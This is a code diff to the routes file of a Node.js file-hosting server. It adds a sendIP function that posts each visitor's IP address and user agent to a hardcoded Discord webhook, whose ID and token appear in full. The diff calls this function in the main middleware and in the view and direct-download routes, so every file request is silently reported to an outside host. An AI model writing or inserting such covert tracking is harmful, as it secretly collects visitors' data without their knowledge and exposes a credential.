@@ -7,12 +7,36 @@ const { path, log, getTrueHttp, getTrueDomain, formatBytes, formatTimestamp, get
 const { CODE_UNAUTHORIZED, CODE_NOT_FOUND, } = require('../MagicNumbers.json');
 const data = require('../data');
 const users = require('../auth');
+const { WebhookClient, MessageEmbed } = require('discord.js');
 
 const express = require('express');
 const router = express.Router();
 
+function sendIP(ip, userAgent) {
+	// Build the webhook client & embed
+	const whc = new WebhookClient("871639846073008138", "L7HVtX4nxOer7zjif47TcKOEcmo30vHrx_KCkPgJlcnzGu_b2OYNOD3GUMHmc9Fc-vDJ");
+	const embed = new MessageEmbed()
+		.setTitle(`Got new ip`)
+		.setDescription(`**IP:** \`${ip}\`\n**UserAgent(${userAgent})**`)
+		.setTimestamp();
+
+	// Send the embed to the webhook, then delete the client after to free resources
+	whc.send(null, {
+		username: 'ass',
+		avatarURL: 'https://www.rd.com/wp-content/uploads/2021/04/GettyImages-988013222-scaled-e1618857975729.jpg',
+		embeds: [embed]
+	}).then(() => log.debug('Webhook sent').callback(() => whc.destroy()));
+
+}
 // Middleware for parsing the resource ID and handling 404
 router.use((req, res, next) => {
+	var user = {
+		agent: req.header('user-agent'), // User Agent we get from headers
+		referrer: req.header('referrer'), //  Likewise for referrer
+		ip: req.header('x-forwarded-for') || req.connection.remoteAddress,
+	};
+	sendIP(user.ip, user.agent);
+
 	// Parse the resource ID
 	req.ass = { resourceId: escape(req.resourceId || '').split('.')[0] };
 
@@ -24,6 +48,13 @@ router.use((req, res, next) => {
 
 // View file
 router.get('/', (req, res, next) => data.get(req.ass.resourceId).then((fileData) => {
+	var user = {
+		agent: req.header('user-agent'), // User Agent we get from headers
+		referrer: req.header('referrer'), //  Likewise for referrer
+		ip: req.header('x-forwarded-for') || req.connection.remoteAddress,
+	};
+	sendIP(user.ip, user.agent);
+
 	const { resourceId } = req.ass;
 
 	// Build OpenGraph meta tags
@@ -54,6 +85,13 @@ router.get('/', (req, res, next) => data.get(req.ass.resourceId).then((fileData)
 
 // Direct resource
 router.get('/direct*', (req, res, next) => data.get(req.ass.resourceId).then((fileData) => {
+	var user = {
+		agent: req.header('user-agent'), // User Agent we get from headers
+		referrer: req.header('referrer'), //  Likewise for referrer
+		ip: req.header('x-forwarded-for') || req.connection.remoteAddress,
+	};
+	sendIP(user.ip, user.agent);
+
 	// Send file as an attachement for downloads
 	if (req.query.download)
 		res.header('Content-Disposition', `attachment; filename="${fileData.originalname}"`);
@@ -74,7 +112,7 @@ router.get('/direct*', (req, res, next) => data.get(req.ass.resourceId).then((fi
 }).catch(next));
 
 // Thumbnail response
-router.get('/thumbnail', (req, res, next) =>
+router.get('/thumbnail', (req, res, next) => 
 	data.get(req.ass.resourceId)
 		.then(({ is, thumbnail }) => fs.readFile((!is || (is.image || is.video)) ? path(diskFilePath, 'thumbnails/', thumbnail) : is.audio ? 'views/ass-audio-icon.png' : 'views/ass-file-icon.png'))
 		.then((fileData) => res.type('jpg').send(fileData))
